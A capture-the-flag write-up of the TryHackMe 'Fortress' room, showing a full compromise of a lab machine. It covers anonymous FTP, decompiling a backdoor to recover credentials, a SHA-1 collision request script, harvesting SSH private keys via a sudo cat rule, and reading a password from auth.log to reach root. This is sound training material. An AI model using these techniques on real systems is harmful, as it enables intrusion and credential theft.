<h1 align="center">Fortress</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/b9472b86-f92d-480b-b908-ce58cc7128e2"><br>
August 30, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>481</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Hack this machine and reclaim the fortress from the Evil Overlord!</em>.<br>
Access it <a href="https://tryhackme.com/room/fortress"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/df979e98-b488-43fc-ac5e-8be4a7bded16"></p>

<br>
<br>

<h2>Task 1 . Introduction</h2>
<p>The box contains CTF-based challenges, to-be-solved in a story driven format. The good part is that story is not related to the hints and you can pull this off without reading through the story... So if you want to skip the boring part and dive right into hacking, you can feel free to.<br>

The format of the story is divided into 3 chapters... With each part being revealed as you progress.<br>

Hint: in this room there is no need to brute-force any user credentials.<br>

Last but not the least... If you feel lost inside the maze, just believe that you're inside the fortress, fully-controlled by the evil-devil overlord. If I were you I won't believe everything I see. Remember: Things are not always how they look like. :upside_down:</p>

<p><em>Answer the question below</em></p>

<p>1.1. Read the above<br>
<code>No answer needed</code></p>

<h2>Task 2 . Prepare for battle</h2>
<p>Welcome Chief, the fortress have been undertaken by the so-called overlords... Other clans have retreated their forces from the war observing how quickly they have patched up the weak-endings of the fort. Only you can save us now. Go in, hack the evil leader's fortress, the pacifists are counting on you...<br>

Uhm, chief, make sure you set your radar to point to these mission endpoints:<br>

- MACHINE_IP   fortress
- MACHINE_IP   temple.fortress

These are gonna help you get inside the fortress, but once you get in there you're gonna be on your own. "I will pray for you, chief", said the pilot.</p>

<p><em>Answer the questions below</em></p>

<p>2.1. What is the flag in user.txt<br>
<code>********************************</code></p>


<p>2.2. Escalate your privileges, what is the flag in root.txt<br>
<code>*******************************</code></p>


<h2>/etc/hosts</h2>

```bash
xx.xxx.xx.xx fortress temple.fortress
```

<h2>Nmap</h2>
<p>

- 22 : SSH<br>
- 5581 : FTP<br>
- 5752 : Telnet<br>
- 7331 : HTTP</p>

```bash
:~# nmap -sC -sV -p- -T4 fortress
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:d0:bb:c7:e2:ee:7f:91:fe:c2:6a:a6:bb:b2:e1:91 (RSA)
|   256 06:4b:fe:c0:6e:e4:f4:7e:e1:db:1c:e7:79:9d:2b:1d (ECDSA)
|_  256 0d:0e:ce:57:00:1a:e2:8d:d2:1b:2e:6d:92:3e:65:c4 (ED25519)
5581/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           305 Jul 25  2021 marked.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:xx.xxx.xx.xx
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
5752/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, LANDesk-RC, LPDString, RTSPRequest, SIPOptions, X11Probe: 
|     Chapter 1: A Call for help
|     Username: Password:
|   Kerberos, LDAPBindReq, LDAPSearchReq, NCP, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie: 
|     Chapter 1: A Call for help
|_    Username:
7331/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

<h2>FTP</h2>
<p>

- marked.txt<br>
- .file</p>

```bash
:~# ftp fortress 5581
Connected to fortress.
220 (vsFTPd 3.0.3)
Name (fortress:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jul 25  2021 .
drwxr-xr-x    2 ftp      ftp          4096 Jul 25  2021 ..
-rw-r--r--    1 ftp      ftp          1255 Jul 25  2021 .file
-rw-r--r--    1 ftp      ftp           305 Jul 25  2021 marked.txt
226 Directory send OK.
ftp> get .file
local: .file remote: .file
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .file (1255 bytes).
226 Transfer complete.
1255 bytes received in 0.00 secs (2.0389 MB/s)
ftp> get marked.txt
local: marked.txt remote: marked.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for marked.txt (305 bytes).
226 Transfer complete.
305 bytes received in 0.03 secs (10.5779 kB/s)
ftp> exit
221 Goodbye.
```

<h3>marked.txt</h3>
<p>

- Identified a username and a command in marked.txt.<br>
- username veekay<br>
- command mkdir /home/veekay/ftp</p>

```bash
:~# file marked.txt
marked.txt: ASCII text, with very long lines
```

```bash
:~# cat marked.txt
If youre reading this, then know you too have been marked by the overlords... Help memkdir /home/veekay/ftp I have been stuck inside this prison for days no light, no escape... Just darkness... Find the backdoor and retrieve the key to the map... Arghhh, theyre coming... HELLLPPPPPmkdir /home/veekay/ftp
```

<h3>.file</h3>

```bash
:~# file .file
.file: python 2.7 byte-compiled
```

```bash
:~# pip3 install uncompyle6
```

```bash
:~# mv .file file.pyc
```

```bash
:~# uncompyle6 file.pyc
# uncompyle6 version 3.9.2
# Python bytecode version base 2.7 (62211)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: ../backdoor/backdoor.py
# Compiled at: 2021-04-29 03:56:57
import socket, subprocess
from Crypto.Util.number import bytes_to_long
usern = 232340432076717036154994L
passw = 10555160959732308261529999676324629831532648692669445488L
port = 5752
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', port))
s.listen(10)

def secret():
    with open('secret.txt', 'r') as f:
        reveal = f.read()
        return reveal

while True:
    try:
        conn, addr = s.accept()
        conn.send('\n\tChapter 1: A Call for help\n\n')
        conn.send('Username: ')
        username = conn.recv(1024).decode('utf-8').strip()
        username = bytes(username, 'utf-8')
        conn.send('Password: ')
        password = conn.recv(1024).decode('utf-8').strip()
        password = bytes(password, 'utf-8')
        if bytes_to_long(username) == usern and bytes_to_long(password) == passw:
            directory = bytes(secret(), 'utf-8')
            conn.send(directory)
            conn.close()
        else:
            conn.send('Errr... Authentication failed\n\n')
            conn.close()
    except:
        continue

# okay decompiling file.pyc
```

```bash
from Crypto.Util.number import bytes_to_long,long_to_bytes
username = '232340432076717036154994'
password = '10555160959732308261529999676324629831532648692669445488'

print("--------- Username:  ", long_to_bytes(username).decode())
print("--------- Password:  ", long_to_bytes(password).decode())
```

<h2>Credentials</h2>

```bash
:~# python3 credentials.py
--------- Username:   1337-h4x0r
--------- Password:   n3v3r_g0nn4_g1v3_y0u_up
```

<h2>Telnet . URL Hint</h2>

```bash
:~# telnet fortress 5752
Trying xx.xxx.xx.xx...
Connected to fortress.
Escape character is '^]'.

 Chapter 1: A Call for help

Username: 1337-h4x0r
Password: n3v3r_g0nn4_g1v3_y0u_up
t3mple_0f_y0ur_51n5
Connection closed by foreign host.
```

<h2>HTTP</h2>
<p>

- fortress:7331<br>
- fortress:7331/t3mple_0f_y0ur_51n5.html</p>

<p><img width="800px" src="https://github.com/user-attachments/assets/abe6db70-0a01-4a0f-b0af-48738466e2196"></p>

```bash
<html>
<head>
 <title>Chapter 2</title>
 <link rel='stylesheet' href='assets/style.css' type='text/css'>
</head>
<body>
 <div id="container">
        <center><h1>
         The Temple of Sins
        </h1></center>

        <center>
            <img src="./assets/guardians.png" width="700px" height="400px">
        </center>

<!--
<?php
require 'private.php';
$badchar = '000000';
if (isset($_GET['user']) and isset($_GET['pass'])) {
 $test1 = (string)$_GET['user'];
 $test2 = (string)$_GET['pass'];
$hex1 = bin2hex($test1);
 $hex2 = bin2hex($test2);
…
else if (sha1($test1) === sha1($test2)) {
 print "<pre>'Private Spot: '$spot</pre>";
```

<p><img width="800px" src="https://github.com/user-attachments/assets/034934f1-0e3a-4a5c-972d-7bf3af78df42"></p>

<p>

- fortress:7331/assets/style.css</p>

```bash
/*Am I a hint??

 VGhpcyBpcyBqb3VybmV5IG9mIHRoZSBncmVhdCBtb25rcywgbWFraW5nIHRoaXMgZm9ydHJlc3MgYSBzYWNyZWQgd29ybGQsIGRlZmVuZGluZyB0aGUgdmVyeSBvd24gb2YgdGhlaXIga2luZHMsIGZyb20gd2hhdCBpdCBpcyB0byBiZSB1bmxlYXNoZWQuLi4gVGhlIG9ubHkgb25lIHdobyBjb3VsZCBzb2x2ZSB0aGVpciByaWRkbGUgd2lsbCBiZSBncmFudGVkIGEgS0VZIHRvIGVudGVyIHRoZSBmb3J0cmVzcyB3b3JsZC4gUmV0cmlldmUgdGhlIGtleSBieSBDT0xMSURJTkcgdGhvc2UgZ3VhcmRzIGFnYWluc3QgZWFjaCBvdGhlci4=
*/
```

<p>

- retrieve the <code>key</code> by <code>COLLIDING</code> ...</p>

```bash
:~# echo 'VGhpcyBpcyBqb3VybmV5IG9mIHRoZSBncmVhdCBtb25rcywgbWFraW5nIHRoaXMgZm9ydHJlc3MgYSBzYWNyZWQgd29ybGQsIGRlZmVuZGluZyB0aGUgdmVyeSBvd24gb2YgdGhlaXIga2luZHMsIGZyb20gd2hhdCBpdCBpcyB0byBiZSB1bmxlYXNoZWQuLi4gVGhlIG9ubHkgb25lIHdobyBjb3VsZCBzb2x2ZSB0aGVpciByaWRkbGUgd2lsbCBiZSBncmFudGVkIGEgS0VZIHRvIGVudGVyIHRoZSBmb3J0cmVzcyB3b3JsZC4gUmV0cmlldmUgdGhlIGtleSBieSBDT0xMSURJTkcgdGhvc2UgZ3VhcmRzIGFnYWluc3QgZWFjaCBvdGhlci4=' | base64 -d
This is journey of the great monks, making this fortress a sacred world, defending the very own of their kinds, from what it is to be unleashed... The only one who could solve their riddle will be granted a KEY to enter the fortress world. Retrieve the key by COLLIDING those guards against each other.
```

<h2>Wheb Application Hash Collision . SHA1</h2>
<p>

- https://github.com/bl4de/ctf/blob/master/2017/BostonKeyParty_2017/Prudentialv2/Prudentialv2_Cloud_50.md/</p>

```bash
:~# cat script.py
import requests

username = '255044462D312E33 0A25E2E3 CFD30A0A 0A312030 206F626A 0A3C3C2F 57696474 68203220 3020522F 48656967 68742033 20302052 2F547970 65203420 3020522F 53756274 79706520 35203020 522F4669 6C746572 20362030 20522F43 6F6C6F72 53706163 65203720 3020522F 4C656E67 74682038 20302052 2F426974 73506572 436F6D70 6F6E656E 7420383E 3E0A7374 7265616D 0AFFD8FF FE002453 48412D31 20697320 64656164 21212121 21852FEC 09233975 9C39B1A1 C63C4C97 E1FFFE01 7F46DC93 A6B67E01 3B029AAA 1DB2560B 45CA67D6 88C7F84B 8C4C791F E02B3DF6 14F86DB1 690901C5 6B45C153 0AFEDFB7 6038E972 722FE7AD 728F0E49 04E046C2 30570FE9 D41398AB E12EF5BC 942BE335 42A4802D 98B5D70F 2A332EC3 7FAC3514 E74DDC0F 2CC1A874 CD0C7830 5A215664 61309789 606BD0BF 3F98CDA8 044629A1 3C68746D 6C3E0A3C 73637269 7074206C 616E6775 6167653D 6A617661 73637269 70742074 7970653D 22746578 742F6A61 76617363 72697074 223E0A3C 212D2D20 40617277 202D2D3E 0A0A7661 72206820 3D20646F 63756D65 6E742E67 6574456C 656D656E 74734279 5461674E 616D6528 2248544D 4C22295B 305D2E69 6E6E6572 48544D4C 2E636861 72436F64 65417428 31303229 2E746F53 7472696E 67283136 293B0A69 66202868 203D3D20 27373327 29207B0A 20202020 646F6375 6D656E74 2E626F64 792E696E 6E657248 544D4C20 3D20223C 5354594C 453E626F 64797B62 61636B67 726F756E 642D636F 6C6F723A 5245443B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 383B3C2F 48313E22 3B0A7D20 656C7365 207B0A20 20202064 6F63756D 656E742E 626F6479 2E696E6E 65724854 4D4C203D 20223C53 54594C45 3E626F64 797B6261 636B6772 6F756E64 2D636F6C 6F723A42 4C55453B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 393B3C2F 48313E22 3B0A7D0A 0A3C2F73 63726970 743E0A0A'
password = '25504446 2D312E33 0A25E2E3 CFD30A0A 0A312030 206F626A 0A3C3C2F 57696474 68203220 3020522F 48656967 68742033 20302052 2F547970 65203420 3020522F 53756274 79706520 35203020 522F4669 6C746572 20362030 20522F43 6F6C6F72 53706163 65203720 3020522F 4C656E67 74682038 20302052 2F426974 73506572 436F6D70 6F6E656E 7420383E 3E0A7374 7265616D 0AFFD8FF FE002453 48412D31 20697320 64656164 21212121 21852FEC 09233975 9C39B1A1 C63C4C97 E1FFFE01 7346DC91 66B67E11 8F029AB6 21B2560F F9CA67CC A8C7F85B A84C7903 0C2B3DE2 18F86DB3 A90901D5 DF45C14F 26FEDFB3 DC38E96A C22FE7BD 728F0E45 BCE046D2 3C570FEB 141398BB 552EF5A0 A82BE331 FEA48037 B8B5D71F 0E332EDF 93AC3500 EB4DDC0D ECC1A864 790C782C 76215660 DD309791 D06BD0AF 3F98CDA4 BC4629B1 3C68746D 6C3E0A3C 73637269 7074206C 616E6775 6167653D 6A617661 73637269 70742074 7970653D 22746578 742F6A61 76617363 72697074 223E0A3C 212D2D20 40617277 202D2D3E 0A0A7661 72206820 3D20646F 63756D65 6E742E67 6574456C 656D656E 74734279 5461674E 616D6528 2248544D 4C22295B 305D2E69 6E6E6572 48544D4C 2E636861 72436F64 65417428 31303229 2E746F53 7472696E 67283136 293B0A69 66202868 203D3D20 27373327 29207B0A 20202020 646F6375 6D656E74 2E626F64 792E696E 6E657248 544D4C20 3D20223C 5354594C 453E626F 64797B62 61636B67 726F756E 642D636F 6C6F723A 5245443B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 383B3C2F 48313E22 3B0A7D20 656C7365 207B0A20 20202064 6F63756D 656E742E 626F6479 2E696E6E 65724854 4D4C203D 20223C53 54594C45 3E626F64 797B6261 636B6772 6F756E64 2D636F6C 6F723A42 4C55453B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 393B3C2F 48313E22 3B0A7D0A 0A3C2F73 63726970 743E0A0A'

username = ''.join(username.split(' '))
password = ''.join(password.split(' '))

usernamestr = ''.join(['%' + username[i] + username[i + 1] for i in range(0, len(username)) if i % 2 == 0])
passwordstr = ''.join(['%' + password[i] + password[i + 1] for i in range(0, len(password)) if i % 2 == 0])

response = requests.get('http://fortress:7331/t3mple_0f_y0ur_51n5.php?user={}&pass={}'.format(usernamestr, passwordstr), proxies={'http':'http://localhost:8080'})

print(response.text)
```

<p>

- m0td_f0r_j4x0n.txt</p>

```bash
:~# python3 script.py
<html>
<head>
 <title>Chapter 2</title>
 <link rel='stylesheet' href='assets/style.css' type='text/css'>
</head>
<body>
 <div id="container">
        <video width=100% height=100% autoplay>
            <source src="./assets/flag_hint.mp4" type=video/mp4>
        </video>

<pre>'The guards are in a fight with each other... Quickly retrieve the key and leave the temple: 'm0td_f0r_j4x0n.txt</pre><!-- Hmm are we there yet?? May be we just need to connect the dots -->

<!--    <center>
   <form id="login" method="GET">
    <input type="text" required name="user" placeholder="Username"/><br/>
    <input type="text" required name="pass" placeholder="Password" /><br/>
    <input type="submit"/>
   </form>
  </center>
-->

    </div>

</body>
</html>
```

<p>

- fortress:7331/m0td_f0r_j4x0n.txt<br>
- h4rdy<br>
- private key</p>


<h2>h4rdy´s Private Key</h2>

```bash
"The Temple guards won't betray us, but I fear of their foolishness that will take them down someday. 
I am leaving my private key here for you j4x0n. Prepare the fort, before the enemy arrives"
            - h4rdy

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxxO1IrpzA3klEYGFfD+4wUr5Q85IEEAIpwC+zY547gPJ5xIJE76j
hR8J6sTOsFJNa+PMG/MvqUFcubThbQ7y7GAj5DP1E/TuaTi7T/oARq5z1Zj+ZYyq/HiHp1
...
FG881GZpev3A+Z3VNKj1iN9gVzLcDKuQAAAMEAyvW4u/krg/vMpMRwWsVeLxqzN3SsLOQd
HxEdwnZMZIitYBeUiebkbRCrBy7D0rsFtfF5uC8BKUv7b8WG9YFZhnRvjodVMyYMmORAro
gTdM9rBCdKNMf/z0q36oMpO0On8MkXTv7W1oJ10eoF0oICVU6mKRUAUHmSoxYXN3msvLvZ
u6zkw+OP8QJX2zwbah38yuRhh8xRf2AlXtx2IxklXV/b8+6QH74Z5o7ZVbTLhzsv0fhFLe
8aBV2g1DdSMuSzAAAADmo0eDBuQDB2ZXJmbGF3AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

```bash
:~# nano id_rsa
```

```bash
:~# chmod 600 id_rsa
```

<h2>SSH</h2>

```bash
:~# ssh h4rdy@fortress -i id_rsa
...
h4rdy@fortress:~$
```

```bash
:~# ssh h4rdy@fortress -i id_rsa -t "bash --noprofile"
h4rdy@fortress:~$ ls
Command 'ls' is available in '/bin/ls'
The command could not be located because '/bin' is not included in the PATH environment variable.
ls: command not found
h4rdy@fortress:~$ export SHELL=/bin/bash
h4rdy@fortress:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

```bash
h4rdy@fortress:~$ ls -lah
total 28K
drwxr-xr-x 4 h4rdy h4rdy 4.0K Aug 31 02:44 .
drwxr-xr-x 5 root  root  4.0K Jul 25  2021 ..
-rw------- 1 h4rdy h4rdy   57 Aug 31 02:45 .bash_history
-r--r--r-- 1 root  root  3.1K Jul 25  2021 .bashrc
drwx------ 2 h4rdy h4rdy 4.0K Aug 31 02:42 .cache
-r--r--r-- 1 root  root    17 Jul 25  2021 .profile
drwxr-xr-x 2 h4rdy h4rdy 4.0K Jul 25  2021 .ssh
```

<h2>h4rdy´s privileges</h2>
<p>

- j4x0<br>
- /bin/cat</p>


```bash
h4rdy@fortress:~$ sudo -l
Matching Defaults entries for h4rdy on fortress:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User h4rdy may run the following commands on fortress:
    (j4x0n) NOPASSWD: /bin/cat
```

```bash
h4rdy@fortress:/home/j4x0n$ ls -lah
total 32K
drwxr-xr-x 3 j4x0n j4x0n 4.0K Jul 26  2021 .
drwxr-xr-x 5 root  root  4.0K Jul 25  2021 ..
lrwxrwxrwx 1 j4x0n j4x0n    9 Jul 26  2021 .bash_history -> /dev/null
-rw-r--r-- 1 j4x0n j4x0n  220 Jul 25  2021 .bash_logout
-rw-r--r-- 1 j4x0n j4x0n 3.7K Jul 25  2021 .bashrc
-r--r--r-- 1 root  root   187 Jul 25  2021 endgame.txt
-rw-r--r-- 1 j4x0n j4x0n  655 Jul 25  2021 .profile
drwxr-xr-x 2 j4x0n j4x0n 4.0K Jul 25  2021 .ssh
-r-------- 1 j4x0n j4x0n   33 Jul 25  2021 user.txt
```

<h2>User Flag</h2>

```bash
h4rdy@fortress:/home/j4x0n/.ssh$ sudo -u j4x0n /bin/cat /home/j4x0n/user.txt
********************************
```

<h2>j4x0n´s Private Key</h2>

```bash
h4rdy@fortress:/home/j4x0n/.ssh$ sudo -u j4x0n /bin/cat /home/j4x0n/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAos93HTD06dDQA+pA9T/TQEwGmd5VMsq/NwBm/BrJTpfpn8av0Wzm
...
1QQR8Og910EY5W2KbvYuIbKbRrRZwYGPzJNjRqK/zNi4yAnDLayShx7p4ujAVy0rP2r9A2
rDuPscM6HPszTYfhci5eLlw25zN6fvYruh9DwNd3UQpgKh0XW+7kAThBOTpH67AtFqjYS9
k8ToMpypFXDO0AAAAOajR4MG5AMHZlcmZsYXcBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
h4rdy@fortress:/home/j4x0n/.ssh$
```

<h2>SSH</h2>

```bash
:~# ssh j4x0n@fortress -i id_rsa
...
j4x0n@fortress:~$
```

```bash
j4x0n@fortress:~$ whoami
j4x0n
```

```bash
j4x0n@fortress:~$ id
uid=1000(j4x0n) gid=1000(j4x0n) groups=1000(j4x0n),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

```bash
j4x0n@fortress:~$ pwd
/home/j4x0n
```

```bash
j4x0n@fortress:~$ ls -lah
total 36K
drwxr-xr-x 4 j4x0n j4x0n 4.0K Aug 31 02:59 .
drwxr-xr-x 5 root  root  4.0K Jul 25  2021 ..
lrwxrwxrwx 1 j4x0n j4x0n    9 Jul 26  2021 .bash_history -> /dev/null
-rw-r--r-- 1 j4x0n j4x0n  220 Jul 25  2021 .bash_logout
-rw-r--r-- 1 j4x0n j4x0n 3.7K Jul 25  2021 .bashrc
drwx------ 2 j4x0n j4x0n 4.0K Aug 31 02:59 .cache
-r--r--r-- 1 root  root   187 Jul 25  2021 endgame.txt
-rw-r--r-- 1 j4x0n j4x0n  655 Jul 25  2021 .profile
drwxr-xr-x 2 j4x0n j4x0n 4.0K Jul 25  2021 .ssh
-r-------- 1 j4x0n j4x0n   33 Jul 25  2021 user.txt
```

```bash
j4x0n@fortress:~$ cat endgame.txt
Bwahahaha, you're late my boi!! I have already patched everything... There's nothing you can exploit to gain root... Accept your defeat once and for all, and I shall let you leave alive.
```

<h2>auth.log</h2>

```bash
j4x0n@fortress:/var/log$ cat auth.log
...
Jul 25 21:11:49 fortress sudo:    j4x0n : TTY=pts/0 ; PWD=/home/j4x0n ; USER=root ; COMMAND=/bin/chown -R j4x0n:j4x0n /home/j4x0n/.ssh
Jul 25 21:14:39 fortress sudo:    j4x0n : TTY=pts/0 ; PWD=/home/j4x0n ; USER=root ; COMMAND=/bin/chown j4x0n:j4x0n /home/j4x0n/user.txt
Jul 26 13:50:32 fortress su[2201]: - /dev/pts/0 j4x0n:root
Jul 26 14:03:46 fortress sudo:    j4x0n : TTY=pts/0 ; PWD=/home/j4x0n ; USER=root ; COMMAND=/bin/bash -c echo "j4x0n:84589a1bb8a932e46643b242a55489c0" | chpasswd
Jul 26 14:03:56 fortress su[2378]: - /dev/pts/0 j4x0n:root
Jul 26 14:55:57 fortress sudo:    j4x0n : TTY=pts/0 ; PWD=/home/j4x0n ; USER=root ; COMMAND=/bin/echo j4x0n:yoU_c@nt_guess_1t_in_zillion_years
Jul 26 14:56:18 fortress sudo:    j4x0n : TTY=pts/0 ; PWD=/home/j4x0n ; USER=root ; COMMAND=/bin/bash -c echo "j4x0n:yoU_c@nt_guess_1t_in_zillion_years" | chpasswd
Jul 26 14:56:38 fortress su[1293]: - /dev/pts/0 j4x0n:root
```

<h2>j4x0n´s privileges</h2>
<p>

- (ALL : ALL) ALL</p>


```bash
j4x0n@fortress:~$ sudo -l
Password: 
Sorry, try again.
Password: 
Matching Defaults entries for j4x0n on fortress:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User j4x0n may run the following commands on fortress:
    (ALL : ALL) ALL
```

```bash
j4x0n@fortress:~$ sudo su
```

```bash
root@fortress:/home/j4x0n# cd /root
```

```bash
root@fortress:~# ls
init.sh  note.txt  root.txt
```

```bash
root@fortress:~# cat root.txt
*******************************
```


<h2>Task 3 . Final Thoughts</h2>
<p>I hope you enjoyed the room. If you have any reviews please find me on twitter. Any suggestions or improvements are most welcome. If you would like me to publicly release an official write-up, explaining the challenges and setting them up in this power-packed fortress... let me know!</p>

<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/e631e4fa-05a5-413a-aa83-604f5c8711dd"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/e7e7d059-3d6a-4249-9663-3af4fbd6d474"></p>


<br>
<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 30   | 481      |     112ⁿᵈ    |      5ᵗʰ     |     244ᵗʰ   |     5ᵗʰ    | 123,396  |    934    |    73     |

</div>

<p align="center">Global All Time:   112ⁿᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/c03be1bb-3d37-4f4e-9d3d-a71906199b54"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/aaa4dcef-09b2-48a8-9cd2-3ec64433e8f0"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/23e9d368-ae20-44c7-9e2e-0032ae0026aa"><br>
                  Global monthly:    244ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/3b44604f-4392-4d46-b439-70f30f1e5f83"><br>
                  Brazil monthly:      5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/731d3a9f-d8c0-43e3-9040-75a632971cee"><br>

<br>
<br>

<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
